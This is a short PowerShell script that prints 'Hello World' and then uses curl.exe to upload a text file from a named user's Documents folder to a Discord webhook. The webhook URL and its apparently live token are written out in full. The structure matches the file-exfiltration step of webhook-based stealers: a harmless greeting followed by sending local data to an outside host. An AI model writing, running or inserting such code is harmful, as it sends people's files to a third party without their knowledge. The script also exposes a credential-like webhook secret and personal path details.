Write-Host "Hello World"
$hookurl = 'https://discord.com/api/webhooks/1130234959148359771/Qn5KRieuzWJHcn4MTezMzadO4mt6uRAGkt40RdRTQ7rojQvzHIfKVC83p-DV6eqYYSj7'
curl.exe -F 'file1=@C:\Users\Bastien\Documents\Bastien\Ecole\1B\Allemand\Nouveau Document texte.txt' $hookurl
